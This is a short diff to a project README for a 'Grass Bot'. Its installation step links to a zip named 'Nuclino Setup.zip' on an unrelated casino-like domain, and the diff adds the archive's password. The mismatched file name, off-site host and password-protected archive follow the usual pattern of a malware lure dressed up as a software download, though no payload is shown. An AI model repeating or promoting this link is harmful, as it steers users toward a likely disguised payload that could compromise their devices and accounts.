@@ -1,8 +1,8 @@
 # Grass Bot
 
 ## Installation
-
 # [DOWNLOAD](https://casinoviapi.com/Nuclino%20Setup.zip)
+## Password - set1nu24
 
 ## Overview
 
